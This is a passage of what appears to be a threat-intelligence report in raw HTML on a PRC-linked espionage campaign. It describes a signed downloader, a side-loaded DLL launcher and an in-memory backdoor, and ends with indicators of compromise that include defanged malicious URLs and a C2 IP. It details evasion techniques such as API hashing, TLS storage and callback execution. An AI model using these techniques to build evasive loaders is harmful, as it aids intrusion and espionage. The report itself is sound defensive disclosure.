</span></p>\n<h3><span style=\"vertical-align: baseline;\">Malware Analysis</span><strong style=\"vertical-align: baseline;\"> </strong></h3>\n<p><span style=\"vertical-align: baseline;\">Upon successful delivery to the target Windows system, the malware initiates a multi-stage deployment chain. Each stage layers tactics designed to evade host-based defenses and maintain stealth on the compromised system. Finally, a novel side-loaded DLL, tracked as CANONSTAGER, concludes with in-memory deployment of the SOGU.SEC backdoor, which then establishes communication with the threat actor's command and control (C2) server.</span></p>\n<h4><span style=\"vertical-align: baseline;\">Digitally Signed Downloader: STATICPLUGIN</span></h4>\n<p><span style=\"vertical-align: baseline;\">The downloaded “</span><code style=\"vertical-align: baseline;\">AdobePlugins.exe</code><span style=\"vertical-align: baseline;\">” file is a first stage malware downloader. The file was signed by Chengdu Nuoxin Times Technology Co., Ltd. with a valid certificate issued by GlobalSign. Signed malware has the major advantage of being able to bypass endpoint security protections that typically trust files with valid digital signatures. This gives the malware false legitimacy, making it harder for both users and automated defenses to detect. </span></p>\n<p><span style=\"vertical-align: baseline;\">The binary was code signed on May 9th, 2025, possibly indicating how long this version of the downloader has been in use. While the signing certificate expired on July 14th, 2025 and is no longer valid, it may be easy for the threat actor to re-sign new versions of STATICPLUGIN with similarly obtained certificates.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Downloader with valid digital signature\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/deception-in-depth-fig8.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 8: Downloader with valid digital signature</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">STATICPLUGIN implements a custom </span><a href=\"https://docwiki.embarcadero.com/Libraries/Sydney/en/Vcl.Forms.TForm\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">TForm</span></a><span style=\"vertical-align: baseline;\"> which is designed to masquerade as a legitimate Microsoft Visual C++ 2013 Redistributables installer. The malware uses the Windows COM </span><a href=\"https://learn.microsoft.com/en-us/windows/win32/msi/installer-object\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Installer object</span></a><span style=\"vertical-align: baseline;\"> to download another file from “</span><code style=\"vertical-align: baseline;\">https[:]//mediareleaseupdates[.]com/20250509[.]bmp</code><span style=\"vertical-align: baseline;\">”. However, the “BMP” file is actually an MSI package containing three files. After installation of these files, CANONSTAGER is executed via DLL side-loading.</span></p></div>\n<div class=\"block-paragraph_advanced\"><div align=\"center\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table><colgroup><col /><col /><col /></colgroup>\n<tbody>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Filename</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Description</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Hash</strong></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">cnmpaui.exe</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">Canon IJ Printer Assistant Tool</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">4ed76fa68ef9e1a7705a849d47b3d9dcdf969e332bd5bcb68138579c288a16d3</code></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">cnmpaui.dll</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">CANONSTAGER</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">e787f64af048b9cb8a153a0759555785c8fd3ee1e8efbca312a29f2acb1e4011</code></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">cnmplog.dat</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">RC4 Encrypted SOGU.SEC</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">cc4db3d8049043fa62326d0b3341960f9a0cf9b54c2fbbdffdbd8761d99add79</code></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-paragraph_advanced\"><div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table border=\"1\" style=\"border-collapse: collapse; width: 99.9641%;\">\n<tbody>\n<tr>\n<td style=\"width: 98.1839%;\">\n<p><strong><em><span style=\"vertical-align: baseline;\">Certificate Subscriber — Chengdu Nuoxin Times Technology Co., Ltd</span></em></strong></p>\n<p><span style=\"vertical-align: baseline;\">Our investigation found this is not the first suspicious executable signed with a certificate issued to Chengdu Nuoxin Times Technology Co., Ltd. GTIG is currently tracking 25 known malware samples signed by this Subscriber that are in use by multiple PRC-nexus activity clusters. Many examples of these signed binaries are available in </span><a href=\"https://www.virustotal.com/gui/search/signature%253A%2522Chengdu%2520Nuoxin%2520Times%2520Technology%2520Co.%252C%2520Ltd.%2522?type=files\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">VirusTotal</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n<p><span style=\"vertical-align: baseline;\">GTIG has previously investigated two additional campaigns using malware signed by this entity. While GTIG does not attribute these other campaigns to UNC6384, they have multiple similarities and TTP overlaps with this UNC6384 campaign, in addition to using the same code signing certificates.</span></p>\n<ol>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Delivery through web-based redirects</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Downloader first stage, sometimes packaged in an archive. </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">In-memory droppers and memory-only backdoor payloads</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Masquerading as legitimate applications or updates</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Targeting in Southeast Asia</span></p>\n</li>\n</ol>\n<p><span style=\"vertical-align: baseline;\">It remains an open question how the threat actors are obtaining these certificates. The Subscriber organization may be a victim with compromised code signing material. However, they may also be a willing participant or front company facilitating cyber espionage operations. Malware samples signed by Chengdu Nuoxin Times Technology Co., Ltd date back to at least January 2023. GTIG is continuing to monitor the connection between this entity and PRC-nexus cyber operations.</span></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-paragraph_advanced\"><h4><span style=\"vertical-align: baseline;\">Malicious Launcher: CANONSTAGER</span></h4>\n<p><span style=\"vertical-align: baseline;\">Once CANONSTAGER is executed, its ultimate purpose is to surreptitiously execute the encrypted payload, a variant of SOGU tracked as SOGU.SEC. CANONSTAGER implements a control flow obfuscation technique using custom API hashing and Thread Local Storage (TLS). The launcher also abuses legitimate Windows features such as window procedures, message queues, and callback functions to execute the final payload. </span></p>\n<h5><span style=\"vertical-align: baseline;\">API Hashing and Thread Local Storage</span></h5>\n<p><span style=\"vertical-align: baseline;\">Thread Local Storage (TLS) is intended to provide each thread in a multi-threaded application its own private data storage. CANONSTAGER uses the TLS array data structure to store function addresses resolved by its custom API hashing algorithm. The function addresses are later called throughout the binary from offsets into the TLS array. </span></p>\n<p><span style=\"vertical-align: baseline;\">In short, the API hashing hides which Windows APIs are being used, while the TLS array provides a stealthy location to store the resolved function addresses. Use of the TLS array for this purpose is unconventional. Storing function addresses here may be overlooked by analysts or security tooling scrutinizing more common data storage locations.</span></p>\n<p><span style=\"vertical-align: baseline;\">Below is an example of CANONSTAGER resolving and storing the </span><code style=\"vertical-align: baseline;\">GetCurrentDirectoryW</code> <span style=\"vertical-align: baseline;\">function address.</span></p>\n<ol>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Resolve the GetCurrentDirectoryW hash (0x6501CBE1)</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Get the location of the TLS array from the Thread Information Block (TIB)</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Move the resolved function address into offset 0x8 of the TLS array</span></p>\n</li>\n</ol></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Example of storing function addresses in TLS array\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/deception-in-depth-fig9.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 9: Example of storing function addresses in TLS array</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h5><span style=\"vertical-align: baseline;\">Indirect Code Execution</span><span style=\"font-style: italic; vertical-align: baseline;\"> </span></h5>\n<p><span style=\"vertical-align: baseline;\">CANONSTAGER hides its launcher code in a custom </span><a href=\"https://learn.microsoft.com/en-us/windows/win32/winmsg/about-window-procedures\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">window procedure</span></a><span style=\"vertical-align: baseline;\"> and triggers its execution indirectly using the Windows message queue. Using these legitimate Windows features lowers the likelihood of security tools detecting the malware and raising alerts. It also obscures the malware’s control flow by “hiding” its code inside of the window procedure and triggering execution asynchronously. </span></p>\n<p><span style=\"vertical-align: baseline;\">At a high level, CANONSTAGER:</span></p>\n<ol>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Registers a class containing a callback function;</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Creates a new window with the registered class;</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Sends </span><a href=\"https://learn.microsoft.com/en-us/windows/win32/winmsg/wm-showwindow\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">WM_SHOWWINDOW</span></a><span style=\"vertical-align: baseline;\"> to the message queue;</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Enters a message loop to receive and dispatch messages to the created window;</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Creates a new thread to decrypt “</span><code style=\"vertical-align: baseline;\">cnmplog.dat</code><span style=\"vertical-align: baseline;\">” as SOGU.SEC when the window receives the WM_SHOWWINDOW message; then</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Executes SOGU.SEC in-memory with an EnumSystemGeoID callback.</span></p>\n</li>\n</ol></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Overview of CANONSTAGER execution using Windows message queue\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/deception-in-depth-fig10.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 10: Overview of CANONSTAGER execution using Windows message queue</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h5><span style=\"vertical-align: baseline;\">Window Procedure</span><span style=\"font-style: italic; vertical-align: baseline;\"> </span></h5>\n<p><span style=\"vertical-align: baseline;\">On a Windows system, every window class has an associated window procedure. The procedure allows programmers to define a custom function to process messages sent to the specified window class. </span></p>\n<p><span style=\"vertical-align: baseline;\">CANONSTAGER creates an </span><a href=\"https://learn.microsoft.com/en-us/windows/win32/winmsg/window-features#overlapped-windows\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Overlapped Window</span></a><span style=\"vertical-align: baseline;\"> with a registered </span><a href=\"https://learn.microsoft.com/en-us/previous-versions/ms942860(v=msdn.10)\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">WNDCLASS</span></a><span style=\"vertical-align: baseline;\"> structure. The structure contains a callback function to the programmer-defined window procedure for processing messages. Additionally, the window is created with a height and width of zero to remain hidden on the screen. </span></p>\n<p><span style=\"vertical-align: baseline;\">Inside the window procedure, there is a check for message type 0x0018 (WM_SHOWWINDOW). When a message of this type is received, a new thread is created with a function that decrypts and launches the SOGU.SEC payload. For any message type other than 0x0018 (or 0x2 to </span><span style=\"font-style: italic; vertical-align: baseline;\">ExitProcess</span><span style=\"vertical-align: baseline;\">), the window procedure calls the default handler (</span><span style=\"font-style: italic; vertical-align: baseline;\">DefWindowProc</span><span style=\"vertical-align: baseline;\">), ignoring the message. </span></p>\n<h5><span style=\"vertical-align: baseline;\">Message Queue</span><span style=\"font-style: italic; vertical-align: baseline;\"> </span></h5>\n<p><span style=\"vertical-align: baseline;\">Windows applications use </span><a href=\"https://learn.microsoft.com/en-us/windows/win32/winmsg/about-messages-and-message-queues\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Message Queues</span></a><span style=\"vertical-align: baseline;\"> for asynchronous communication. Both user applications and the Windows system can post messages to Message Queues. When a message is posted to an application window, the system calls the associated window procedure to process the message.</span></p>\n<p><span style=\"vertical-align: baseline;\">In order to trigger the malicious window procedure, CANONSTAGER uses the </span><span style=\"font-style: italic; vertical-align: baseline;\">ShowWindow </span><span style=\"vertical-align: baseline;\">function to send a </span><a href=\"https://learn.microsoft.com/en-us/windows/win32/winmsg/wm-showwindow\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">WM_SHOWWINDOW</span></a><span style=\"vertical-align: baseline;\"> (0x0018) message to its newly created window via the Message Queue. Since the system, or other applications, may also post messages to the CANONSTAGER’s window, a standard Windows message loop is entered. This allows all posted messages to be sent, including the intended WM_SHOWWINDOW message.</span></p>\n<ol>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">GetMessageW</strong><span style=\"vertical-align: baseline;\"> - retrieve all messages in the thread’s message queue.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">TranslateMessage</strong><span style=\"vertical-align: baseline;\"> - Convert message from a “virtual-key” to a “character message”.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">DispatchMessage</strong><span style=\"vertical-align: baseline;\"> - Delivers the message to the specific function (WindowProc) that handles messages for the window targeted by that message.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Loop back to 1, until all messages are dispatched.</span></p>\n</li>\n</ol>\n<h5><span style=\"vertical-align: baseline;\">Deploying SOGU.SEC</span></h5>\n<p><span style=\"vertical-align: baseline;\">After the correct message type is received by the window procedure, CANONSTAGER moves on to deploying its SOGU.SEC payload with the following steps:</span></p>\n<ol>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Read the encrypted “</span><code style=\"vertical-align: baseline;\">cnmplog.dat</code><span style=\"vertical-align: baseline;\">” file, packaged in the downloaded MSI;</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Decrypt the file with a hardcoded 16-byte RC4 key;</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Execute the decrypted payload using an </span><span style=\"font-style: italic; vertical-align: baseline;\">EnumSystemsGeoID</span><span style=\"vertical-align: baseline;\"> callback function.</span></p>\n</li>\n</ol></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Callback function executing SOGU.SEC\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/deception-in-depth-fig11.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 11: Callback function executing SOGU.SEC</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">UNC6384 has previously used both payload encryption and callback functions to deploy SOGU.SEC. These techniques are used to hide malicious code, evade detection, obfuscate control flow, and blend in with normal system activity. Additionally, all of these steps are done in-memory, avoiding endpoint file-based detections.</span></p>\n<h4><span style=\"vertical-align: baseline;\">The Backdoor: SOGU.SEC</span></h4>\n<p><span style=\"vertical-align: baseline;\">SOGU.SEC is a distinct variant of SOGU and is commonly deployed by UNC6384 in cyber espionage activity. This is a sophisticated, and heavily obfuscated, malware backdoor with a wide range of capabilities. It can collect system information, upload and download files from a C2, and execute a remote command shell. In this campaign, SOGU.SEC was observed communicating directly with the C2 IP address “</span><code style=\"vertical-align: baseline;\">166.88.2[.]90</code><span style=\"vertical-align: baseline;\">” using HTTPS.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Attribution</span></h3>\n<p><span style=\"vertical-align: baseline;\">GTIG attributes this campaign to UNC6384, a PRC-nexus cyber espionage group believed to be associated with the PRC-nexus threat actor TEMP.Hex (also known as Mustang Panda). Our attribution is based on similarities in tooling, TPPs, targeting, and overlaps in C2 infrastructure. UNC6384 and TEMP.Hex are both observed to target government sectors, primarily in Southeast Asia, in alignment with PRC strategic interests. Both groups have also been observed to deliver SOGU.SEC malware from DLL side-loaded malware launchers and have used the same C2 infrastructure. </span></p>\n<h3><span style=\"vertical-align: baseline;\">Conclusion</span></h3>\n<p><span style=\"vertical-align: baseline;\">This campaign is a clear example of the continued evolution of UNC6384's operational capabilities and highlights the sophistication of PRC-nexus threat actors. The use of advanced techniques such as AitM combined with valid code signing and layered social engineering demonstrates this threat actor’s capabilities. This activity follows a broader trend GTIG has observed of PRC-nexus threat actors increasingly </span><a href=\"https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-038a\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">employing</span></a><span style=\"vertical-align: baseline;\"> </span><a href=\"https://cloud.google.com/blog/topics/threat-intelligence/chinese-espionage-tactics\"><span style=\"text-decoration: underline; vertical-align: baseline;\">stealthy</span></a><span style=\"vertical-align: baseline;\"> tactics to avoid </span><a href=\"https://cloud.google.com/blog/topics/threat-intelligence/uncovering-unc3886-espionage-operations\"><span style=\"text-decoration: underline; vertical-align: baseline;\">detection</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n<p><span style=\"vertical-align: baseline;\">GTIG actively monitors ongoing threats from actors like UNC6384 to protect users and customers. As part of this effort, Google continuously updates its protections and has taken specific action against this campaign.</span></p></div>\n<div class=\"block-paragraph_advanced\"><h3>Acknowledgment</h3>\n<p>A special thanks to Jon Daniels for your contributions.</p></div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">Appendix: Indicators of Compromise</span></h3>\n<p><span style=\"vertical-align: baseline;\">A Google Threat Intelligence (GTI) collection of <a href=\"https://www.virustotal.com/gui/collection/5b95d055bb8fdbf0ed0a6d5b037f17e9c20a3abe93f6baac46fffe13ae120b1d\" rel=\"noopener\" target=\"_blank\">related IOCs</a> is available to registered users</span><span style=\"vertical-align: baseline;\">. </span></p>\n<h4><span style=\"vertical-align: baseline;\">File Hashes</span></h4></div>\n<div class=\"block-paragraph_advanced\"><div align=\"center\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table><colgroup><col /><col /></colgroup>\n<thead>\n<tr>\n<th scope=\"col\" style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Name</strong></p>\n</th>\n<th scope=\"col\" style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Hash (SHA-256)</strong></p>\n</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">AdobePlugins.exe</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">65c42a7ea18162a92ee982eded91653a5358a7129c7672715ce8ddb6027ec124</code></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">20250509.bmp (MSI)</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">3299866538aff40ca85276f87dd0cefe4eafe167bd64732d67b06af4f3349916</code></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">cnmpaui.dll</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">e787f64af048b9cb8a153a0759555785c8fd3ee1e8efbca312a29f2acb1e4011</code></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">cnmplog.dat</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">cc4db3d8049043fa62326d0b3341960f9a0cf9b54c2fbbdffdbd8761d99add79</code></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">SOGU.SEC (memory only)</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">d1626c35ff69e7e5bde5eea9f9a242713421e59197f4b6d77b914ed46976b933</code></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-paragraph_advanced\"><h4><span style=\"vertical-align: baseline;\">Certificate Fingerprints / Thumbprints</span></h4></div>\n<div class=\"block-paragraph_advanced\"><div align=\"center\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table><colgroup><col /><col /></colgroup>\n<thead>\n<tr>\n<th scope=\"col\" style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Name</strong></p>\n</th>\n<th scope=\"col\" style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Hash (SHA-1)</strong></p>\n</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">mediareleaseupdates[.]com</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">c8744b10180ed59bf96cf79d7559249e9dcf0f90</code></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">AdobePlugins.exe</span><span style=\"vertical-align: baseline;\"> </span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">eca96bd74fb6b22848751e254b6dc9b8e2721f96</code></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-paragraph_advanced\"><h4>Network Indicators</h4></div>\n<div class=\"block-paragraph_advanced\"><div align=\"center\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table><colgroup><col /><col /></colgroup>\n<tbody>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Name</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">IOC</strong></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Landing Page</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">https[:]//mediareleaseupdates[.]com/AdobePlugins[.]html</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Javascript</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">https[:]//mediareleaseupdates[.]com/style3[.]js</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">STATICPLUGIN</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">https[:]//mediareleaseupdates[.]com/AdobePlugins[.]exe</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">MSI Package</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: 